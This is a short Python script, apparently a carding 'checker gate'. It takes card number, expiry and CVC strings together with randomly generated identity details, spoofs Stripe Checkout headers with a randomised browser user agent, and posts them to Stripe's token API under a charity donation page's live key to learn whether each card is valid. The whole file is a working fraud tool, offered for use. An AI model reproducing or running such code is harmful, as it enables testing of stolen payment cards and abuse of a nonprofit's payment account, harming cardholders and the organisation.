import requests
import random
import json

def check_tangaroablue(cc, identity): # OK

	try:

		gate_url = "https://api.stripe.com/v1/tokens"
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		splitted_card = cc.split('|')

		payment_header = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'origin': 'https://checkout.stripe.com',
			'sec-fetch-dest': 'empty',
			'accept-language': 'en-GB',
			'user-agent': gate_user_agent,
			'content-type': 'application/x-www-form-urlencoded',
			'sec-fetch-site': 'same-site',
			'sec-fetch-mode': 'cors',
			'referer': 'https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=31d5b0c4-70c8-d34b-8f08-71046ff10298'
		}

		payment_data = {
			'validation_type': 'card',
			'payment_user_agent': 'Stripe Checkout v3 checkout-manhattan (stripe.js/a44017d)',
			'referrer': 'https://www.tangaroablue.org/about-us/donate/',
			'pasted_fields': 'number',
			'card[number]': splitted_card[0],
			'card[exp_month]': splitted_card[1],
			'card[exp_year]': splitted_card[2],
			'card[cvc]': splitted_card[3],

			'email': identity["results"][0]["email"],
			'card[name]': identity["results"][0]["name"]["first"],
			'card[address_line1]': identity["results"][0]["location"]["street"],
			'card[address_city]': identity["results"][0]["location"]["city"] ,
			'card[address_state]': identity["results"][0]["location"]["state"],
			'card[address_zip]': identity["results"][0]["location"]["postcode"],
			'card[address_country]': 'United States',

			'time_on_page': '132527',
			'guid': 'NA',
			'muid': '9765dc7f-a003-43fb-9999-5602351ba3cc',
			'sid': '6a909e32-d576-4bac-bf88-5372ac3e3ead',
			'key': 'pk_live_eBee6q6n88Q6DCAatTPCOycn00XBRXLwKV'
		}

		payment_request = requests.post(gate_url, headers=payment_header, data=payment_data)
		
		if payment_request.status_code < 300:

			return payment_request.json()

		else: return False

	except Exception as E: raise E